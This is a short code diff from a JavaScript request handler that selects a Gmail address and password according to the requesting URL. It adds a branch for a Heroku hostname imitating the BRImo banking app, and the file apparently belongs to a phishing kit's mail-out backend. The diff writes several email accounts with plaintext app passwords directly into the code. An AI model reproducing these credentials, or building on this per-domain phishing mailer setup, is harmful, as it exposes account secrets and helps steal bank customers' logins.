@@ -22,10 +22,9 @@ export default function handler(req, res) {
         email = 'alamalam312zx@gmail.com' ;
         pass = 'kgyvskkowvhosxrj' ;
 
-    }
-    else {
-        email = 'bripembukaanrekening@gmail.com';
-        pass = 'nocpaagwmdvyyoin';
+    } else if (url == 'app-log-brimo-bifast.herokuapp.com'){
+        email = 'brigacor80@gmail.com';
+        pass = 'zhzcfhbdtzipldsz';
     }
         
         try {
